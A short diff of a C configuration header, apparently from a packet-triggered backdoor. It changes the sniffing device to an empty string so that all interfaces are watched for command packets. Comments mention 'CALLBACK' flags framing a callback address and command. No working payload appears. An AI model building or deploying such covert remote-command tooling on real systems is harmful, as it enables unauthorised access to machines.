@@ -12,7 +12,7 @@
 /* PCAPDEV is the device on which to sniff packets for commands.  If it is
  * NULL, not defined or is the empty string, all available devices will be
  * used. */
-#define CAPTUREDEV "axe0"
+#define CAPTUREDEV ""
 
 /* These two strings surround the callback address and command, respectively. */
 #define CBFLAG  "CALLBACK"
